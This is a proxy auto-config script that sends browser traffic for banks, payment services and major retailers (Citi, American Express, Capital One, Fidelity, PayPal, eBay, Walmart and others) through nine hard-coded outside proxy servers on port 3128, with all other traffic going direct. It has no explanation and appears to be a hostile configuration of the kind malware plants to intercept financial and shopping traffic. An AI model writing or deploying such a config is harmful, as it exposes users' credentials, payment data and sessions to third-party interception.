function FindProxyForURL(url, host){
if ((shExpMatch(host, "*.adobe.com")) || (shExpMatch(host, "*.realtor.com")) || (shExpMatch(host, "*.tripadvisor.com")) || (shExpMatch(host, "*.ebay.com")) || (shExpMatch(host, "*.target.com")) || (shExpMatch(host, "*.americanexpress.com")))
return "PROXY 176.67.168.217:3128";
if ((shExpMatch(host, "*.walmart.com")) || (shExpMatch(host, "*.citi.com")) || (shExpMatch(host, "*.xfinity.com")) || (shExpMatch(host, "*.bestbuy.com")))
return "PROXY 109.123.93.238:3128";
if ((shExpMatch(host, "*.cbssports.com")) || (shExpMatch(host, "*.att.com")) || (shExpMatch(host, "*.apple.com")) || (shExpMatch(host, "*.microsoft.com")))
return "PROXY 205.204.85.12:3128";
if ((shExpMatch(host, "*.foxnews.com")) || (shExpMatch(host, "*.usps.com")) || (shExpMatch(host, "*.macys.com")))
return "PROXY 176.67.169.185:3128";
if ((shExpMatch(host, "*.pinterest.com")) || (shExpMatch(host, "*.groupon.com")))
return "PROXY 50.31.252.80:3128";
if ((shExpMatch(host, "*.lowes.com")) || (shExpMatch(host, "*.hulu.com")))
return "PROXY 98.158.184.157:3128";
if ((shExpMatch(host, "*.fedex.com")) || (shExpMatch(host, "*.capitalone.com")))
return "PROXY 119.252.188.33:3128";
if ((shExpMatch(host, "*.cnet.com")) || (shExpMatch(host, "*.kohls.com")) || (shExpMatch(host, "*.ups.com")))
return "PROXY 187.45.186.35:3128";
if ((shExpMatch(host, "*.fidelity.com")) || (shExpMatch(host, "*.paypal.com")))
return "PROXY 199.195.193.17:3128";
return "DIRECT";
}
